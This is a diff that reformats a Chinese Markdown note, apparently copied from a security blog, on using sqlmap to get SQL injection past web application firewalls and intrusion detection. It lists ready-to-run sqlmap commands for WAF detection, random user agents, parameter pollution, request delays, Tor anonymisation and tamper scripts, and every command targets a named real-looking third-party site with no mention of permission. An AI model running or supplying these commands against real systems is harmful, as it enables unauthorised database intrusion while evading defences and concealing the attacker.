@@ -1,17 +1,22 @@
 ## 使用sqlmap 绕过防火墙进行注入测试
 
 http://www.91ri.org/6775.html
-0x00 前言
-   现在的网络环境往往是WAF/IPS/IDS保护着Web 服务器等等，这种保护措施往往会过滤挡住我们的SQL注入查询链接，甚至封锁我们的主机IP，所以这个时候，我们就要考虑怎样进行绕过，达到注入的目标。因为现在WAF/IPS/IDS都把sqlmap 列入黑名单了，呵呵！但是本文基于sqlmap 进行绕过注入测试，介绍至今仍然实用有效的技巧，以下策略在特定的环境能够成功绕过，具体是否绕过，请仔细查看输出的信息。
+## 0x00 前言
+   现在的网络环境往往是WAF/IPS/IDS保护着Web 服务器等等，这种保护措施往往会过滤挡住我们的SQL注入查询链接，甚至封锁我们的主机IP，所以这个时候，我们就要考虑怎样进行绕过，达到注入的目标。因为现在`WAF/IPS/IDS`都把sqlmap 列入黑名单
+   
+   但是本文基于`sqlmap` 进行绕过注入测试，介绍至今仍然实用有效的技巧，以下策略在特定的环境能够成功绕过，具体是否绕过，请仔细查看输出的信息。
 
-0x01 确认WAF
-     首先我们判断该Web 服务器是否被WAF/IPS/IDS保护着。这点很容易实现，因为我们在漏扫或者使用专门工具来检测是否有WAF，这个检测，在nmap 的NSE，或者WVS的策略或者APPSCAN的策略中都有，我们可以利用这些来判断。在此我们，也介绍使用sqlmap 进行检测是否有WAF/IPS/IDS
+-------
+## 0x01 确认WAF
+     首先我们判断该`Web` 服务器是否被`WAF/IPS/IDS`保护着。这点很容易实现，
+     因为我们在漏扫或者使用专门工具来检测是否有`WAF`，这个检测，在`nmap` 的`NSE`，或者`WVS`的策略或者`APPSCAN`的策略中都有，我们可以利用这些来判断
+     在此我们，也介绍使用sqlmap 进行检测是否有WAF/IPS/IDS
 
 `root@kali:~# sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4" --thread 10 --identify-waf#首选`
 
 `root@kali:~# sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4" --thread 10  f--check-waf#备选`
 
-0x02 使用参数进行绕过
+## 0x02 使用参数进行绕过
 root@kali:~# sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4" --random-agent -v 2 #使用任意浏览器进行绕过，尤其是在WAF配置不当的时候
 
 root@kali:~# sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4" --hpp -v 3#使用HTTP 参数污染进行绕过，尤其是在ASP.NET/IIS 平台上
@@ -30,7 +35,10 @@ root@kali:~# sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4"  -
 
 root@kali:~# sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4" --tor # 匿名注入
 
-0x03 使用脚本介绍
+
+-------
+
+## 0x03 使用脚本介绍
 1 使用格式：
 root@kali:~# sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4" --tamper=A.py,B.py#脚本A，脚本B 
 
@@ -102,8 +110,9 @@ root@kali:~# sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4" --
 33 halfversionedmorekeywords.py#MySQL < 5.1中关键字前加注释
 
  
+----------
+## 0x04 脚本参数组合策略绕过
 
-0x04脚本参数组合策略绕过
 1 mysql绕过：
 root@kali:~# sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4" --random-agent -v 2 -delay=3.5 --tamper=space2hash.py,modsecurityversioned.py
 
